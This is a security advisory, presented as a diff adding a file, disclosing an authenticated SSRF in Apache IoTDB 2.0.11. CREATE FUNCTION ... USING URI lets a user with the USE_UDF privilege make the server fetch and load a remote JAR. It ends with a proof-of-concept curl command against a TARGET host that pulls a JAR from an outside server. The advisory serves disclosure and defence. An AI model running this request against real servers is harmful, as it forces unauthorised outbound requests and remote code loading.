@@ -1,0 +1,51 @@
+
+
+Apache IoTDB 2.0.11 Authenticated Server-Side Request Forgery
+
+
+Vendor: The Apache Software Foundation
+Product web page: https://iotdb.apache.org
+Affected version: 2.0.11
+
+Summary: Apache IoTDB is an industrial IoT time-series database
+management system that adopts a lightweight architecture with
+edge-cloud collaboration, supporting integrated collection,
+storage, management, and analysis of IoT time-series data. It
+features multi-protocol compatibility, ultra-high compression
+ratio, high-throughput read/write capabilities, industrial-grade
+stability, and minimal maintenance requirements.
+
+Desc: Apache IoTDB is affected by an authenticated server-side
+request forgery (SSRF) in its user-defined function mechanism.
+CREATE FUNCTION ... USING URI makes the DataNode download the
+UDF implementation from a user-supplied URI, validating only
+that the scheme is set and not file, with no host/scheme allowlist.
+A user holding the USE_UDF privilege (grantable to non-super users)
+can therefore force the server to issue arbitrary outbound requests
+to internal services or cloud-metadata endpoints. The fetched
+resource is a remote JAR that is then loaded and executed; because
+USE_UDF already grants server-side code execution, the JAR load
+is not a new capability, but the unauthenticated, plain-HTTP,
+integrity-unchecked remote fetch is an additional supply-chain/MITM
+hardening gap.
+
+Tested on: Ubuntu 22.04
+           Eclipse Temurin OpenJDK 21.0.6 (LTS)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-6020
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6020
+
+
+13.08.2026
+
+--
+
+
+$ curl -s -u idemo:ajdemo 'http://TARGET:18080/rest/v2/nonQuery' \
+> -H 'Content-Type: application/json' \
+> --data "{\"sql\":\"CREATE FUNCTION zslssrf AS 'org.zsl.Probe' USING URI 'http://problem.zeroscience.mk:8888/probe.jar'\"}"
